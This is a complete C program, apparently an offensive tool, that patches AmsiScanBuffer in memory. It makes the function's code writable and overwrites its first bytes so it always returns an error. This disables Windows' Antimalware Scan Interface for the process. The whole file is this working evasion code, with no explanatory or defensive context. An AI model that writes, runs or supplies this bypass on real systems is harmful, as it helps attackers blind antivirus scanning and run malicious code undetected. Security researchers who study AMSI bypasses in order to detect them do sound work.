#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE handle_amsi = LoadLibraryA("amsi.dll");
    if (handle_amsi == NULL) {
        printf("Loading amsi.dll failed.\n");
        return 1;
    }

    void* ptr_amsi_scan_buffer = GetProcAddress(handle_amsi, "AmsiScanBuffer");
    if (ptr_amsi_scan_buffer == NULL) {
        printf("Locating AmsiScanBuffer failed.\n");
        return 1;
    }

    printf("[+] AmsiScanBuffer: %p\n", ptr_amsi_scan_buffer);
    
    // mov eax,0x80070057 0xB8, 0x57, 0x00, 0x07, 0x80
    // mov eax,0x00000001 0xB8, 0x01, 0x00, 0x00, 0x00
    // ret 0xC3
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    DWORD old_protect;
    if (VirtualProtect(ptr_amsi_scan_buffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[+] Privilege changed. Patching started.\n");

        memcpy(ptr_amsi_scan_buffer, patch, sizeof(patch));
        VirtualProtect(ptr_amsi_scan_buffer, sizeof(patch), old_protect, &old_protect);
        
        printf("[+] AmsiScanBuffer patched successfully.\n");

        
    } else {
        printf("[-] VirtualProtect failed. Error: %lu\n", GetLastError());
    }

    return 0;
}